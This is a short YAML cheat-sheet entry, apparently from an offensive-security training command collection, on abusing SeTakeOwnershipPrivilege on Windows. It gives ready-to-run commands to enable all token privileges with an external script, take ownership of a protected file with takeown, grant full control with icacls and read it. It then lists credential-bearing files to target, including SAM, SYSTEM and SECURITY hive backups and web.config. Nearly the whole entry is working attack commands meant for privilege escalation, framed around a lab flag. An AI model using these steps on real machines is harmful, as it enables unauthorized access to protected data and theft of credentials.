---
description: |
  This guide demonstrates how to enumerate and abuse the SeTakeOwnershipPrivilege on Windows to take ownership of files and read sensitive data. It covers enabling the privilege, identifying target files, taking ownership, modifying ACLs, and reading protected files. This is useful for privilege escalation and accessing restricted information.

  Command Reference:

      Target: Local Windows machine with SeTakeOwnershipPrivilege

command: |
  whoami /priv | findstr /i "SeTakeOwnershipPrivilege"

code: |
  # Enable SeTakeOwnershipPrivilege
    Import-Module .\Enable-Privilege.ps1
    .\EnableAllTokenPrivs.ps1
    whoami /priv

  # Choose a target file and check its owner
    Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

  # Check file ownership via CMD
    cmd /c dir /q 'C:\TakeOwn'
    
  # Take ownership of the file
    takeown /f 'C:\TakeOwn\flag.txt'

  # Confirm ownership change
    Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

  # Modify file ACL to grant full access
    icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F

  # Read the file
    cat 'C:\TakeOwn\flag.txt'

  # Other files of interest
    c:\inetpub\wwwwroot\web.config
    %WINDIR%\repair\sam
    %WINDIR%\repair\system
    %WINDIR%\repair\software, %WINDIR%\repair\security
    %WINDIR%\system32\config\SecEvent.Evt
    %WINDIR%\system32\config\default.sav
    %WINDIR%\system32\config\security.sav
    %WINDIR%\system32\config\software.sav
    %WINDIR%\system32\config\system.sav

items:
  -
services:
  -
OS:
  - Windows
attack_types:
  - Enumeration
  - Privilege Escalation
references:
  - https://www.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/token-privileges
  - https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
---